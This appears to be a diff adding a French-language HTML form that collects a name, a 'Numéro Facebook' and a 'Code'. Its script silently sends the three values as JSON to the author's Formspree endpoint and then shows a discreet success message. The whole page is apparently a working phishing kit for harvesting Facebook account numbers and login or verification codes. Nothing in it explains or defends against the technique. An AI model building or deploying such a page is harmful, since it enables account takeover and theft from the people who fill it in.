@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulaire d'insertion</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background-color: #f4f4f9;
+    }
+    .form-container {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 400px;
+      margin: 0 auto;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0 15px 0;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      width: 100%;
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    /* Zone de message de succès discrète */
+    #message-confirmation {
+      margin-top: 20px;
+      background: #d4edda;
+      color: #155724;
+      padding: 15px;
+      border-radius: 5px;
+      text-align: center;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <h2>Saisie des informations</h2>
+    
+    <form id="monFormulaire" onsubmit="envoyerFormulaire(event)">
+      <label for="nom">Nom :</label>
+      <input type="text" id="nom" name="nom" placeholder="Entrez le nom" required>
+
+      <label for="numero">Numéro Facebook :</label>
+      <input type="text" id="numero" name="numero" placeholder="Entrez le numéro Facebook" required>
+
+      <label for="code">Code :</label>
+      <input type="text" id="code" name="code" placeholder="Entrez le code" required>
+
+      <button type="submit" id="btnEnvoyer">Envoyer</button>
+    </form>
+
+    <div id="message-confirmation">Informations bien envoyées !</div>
+  </div>
+
+  <script>
+    function envoyerFormulaire(event) {
+      // Empêche le rechargement de la page
+      event.preventDefault();
+
+      let btn = document.getElementById("btnEnvoyer");
+      btn.innerText = "Envoi en cours...";
+      btn.disabled = true;
+
+      let nomVal = document.getElementById("nom").value;
+      let numeroVal = document.getElementById("numero").value;
+      let codeVal = document.getElementById("code").value;
+
+      // Envoi des données vers ton lien Formspree en arrière-plan
+      fetch("https://formspree.io/f/mjyylzal", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          Nom: nomVal,
+          NumeroFacebook: numeroVal,
+          Code: codeVal
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          // Réinitialise le formulaire et affiche le message de succès
+          document.getElementById("monFormulaire").reset();
+          document.getElementById("message-confirmation").style.display = "block";
+          btn.innerText = "Envoyer";
+          btn.disabled = false;
+        } else {
+          alert("Une erreur est survenue lors de l'envoi.");
+          btn.innerText = "Envoyer";
+          btn.disabled = false;
+        }
+      })
+      .catch(error => {
+        alert("Erreur de connexion.");
+        btn.innerText = "Envoyer";
+        btn.disabled = false;
+      });
+    }
+  </script>
+
+</body>
+</html>
+  
